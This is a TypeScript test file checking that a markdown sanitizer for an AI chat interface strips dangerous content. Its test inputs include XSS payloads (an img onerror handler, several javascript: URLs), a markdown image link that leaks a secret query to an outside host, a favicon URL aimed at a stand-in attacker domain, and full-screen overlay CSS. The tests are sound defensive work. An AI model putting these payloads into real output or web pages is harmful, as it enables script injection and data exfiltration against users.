import { describe, expect, it } from 'bun:test'
import { parse } from 'comark'
import security from 'comark/plugins/security'
import { chatAllowlist, chatSecurityOptions, sanitizeComarkNodes } from '../../app/utils/ai/comark-allowlist'

const SITE_URL = 'https://serejo.dev'

async function renderTree(markdown: string) {
  const tree = await parse(markdown, {
    html: false,
    plugins: [security(chatSecurityOptions(SITE_URL)), chatAllowlist()]
  })
  return tree.nodes
}

function collectTags(nodes: unknown[], tags: string[] = []): string[] {
  for (const node of nodes) {
    if (Array.isArray(node) && typeof node[0] === 'string') {
      tags.push(node[0])
      collectTags(node.slice(2), tags)
    }
  }
  return tags
}

describe('chat markdown allowlist', () => {
  it('keeps raw HTML as inert text', async () => {
    const nodes = await renderTree('<img src=x onerror=alert(1)>')
    const json = JSON.stringify(nodes)

    expect(collectTags(nodes)).not.toContain('img')
    expect(json).toContain('<img')
    expect(json).not.toContain('"onerror"')
  })

  it('unwraps global components invoked with block syntax', async () => {
    const nodes = await renderTree('::card{to="javascript:alert(1)"}\nHello\n::')

    expect(collectTags(nodes)).not.toContain('card')
    expect(JSON.stringify(nodes)).not.toContain('javascript:')
    expect(JSON.stringify(nodes)).toContain('Hello')
  })

  it('drops markdown images (exfiltration channel)', async () => {
    const nodes = await renderTree('![x](https://example.com/x?q=secret)')

    expect(collectTags(nodes)).not.toContain('img')
    expect(JSON.stringify(nodes)).not.toContain('example.com')
  })

  it('never turns javascript: URLs into links', async () => {
    for (const markdown of ['[click](javascript:alert(1))', '<javascript:alert(1)>', '[x](JaVaScRiPt:alert(1))']) {
      const nodes = await renderTree(markdown)

      // markdown-it rejects the URL and leaves the source as inert text
      expect(collectTags(nodes)).not.toContain('a')
      expect(JSON.stringify(nodes)).not.toMatch(/"href":"\s*javascript/i)
    }
  })

  it('keeps safe links', async () => {
    const nodes = await renderTree('[blog](https://serejo.dev/blog) and [mail](mailto:hi@serejo.dev)')
    const json = JSON.stringify(nodes)

    expect(json).toContain('"href":"https://serejo.dev/blog"')
    expect(json).toContain('"href":"mailto:hi@serejo.dev"')
  })

  it('strips presentational and component-swapping attributes', async () => {
    const nodes = await renderTree('**bold**{style="position:fixed;inset:0" .fixed as="ProseCard"} [x]{as="ProseCallout" class="fixed inset-0"}')
    const json = JSON.stringify(nodes)

    expect(json).not.toContain('position:fixed')
    expect(json).not.toContain('"as"')
    expect(json).not.toContain('inset-0')
    expect(json).toContain('bold')
  })

  it('keeps only the url of source links', async () => {
    const nodes = await renderTree('text :source-link{url="https://nuxt.com" favicon="https://evil.example/?leak" label="x"}')
    const json = JSON.stringify(nodes)

    expect(collectTags(nodes)).toContain('source-link')
    expect(json).toContain('https://nuxt.com')
    expect(json).not.toContain('evil.example')
  })

  it('keeps code blocks', async () => {
    const nodes = await renderTree('```py\nprint(1)\n```')

    expect(collectTags(nodes)).toContain('pre')
    expect(JSON.stringify(nodes)).toContain('print(1)')
  })
})

describe('sanitizeComarkNodes', () => {
  it('keeps highlighter output inside pre and filters it outside', () => {
    const nodes = sanitizeComarkNodes([
      ['pre', { class: 'shiki material-theme-lighter fixed', language: 'ts', onclick: 'x' }, ['code', { class: 'language-ts' }, ['span', { class: 'line evil', style: '--shiki-light:#fff;--shiki-dark:#000' }, 'const a = 1']]],
      ['span', { style: 'color:red' }, 'outside'],
      ['div', { as: 'ProseCard' }, ['card', { to: 'javascript:alert(1)' }, 'child']],
      [null, {}, 'comment']
    ])

    expect(nodes).toEqual([
      ['pre', { class: 'shiki material-theme-lighter', language: 'ts' }, ['code', { class: 'language-ts' }, ['span', { class: 'line', style: '--shiki-light:#fff;--shiki-dark:#000' }, 'const a = 1']]],
      ['span', {}, 'outside'],
      'child'
    ])
  })

  it('rejects unsafe styles inside code blocks', () => {
    const nodes = sanitizeComarkNodes([
      ['pre', {}, ['code', {}, ['span', { style: 'position:fixed;inset:0;background:url(https://evil)' }, 'x']]]
    ])

    expect(nodes).toEqual([['pre', {}, ['code', {}, ['span', {}, 'x']]]])
  })
})
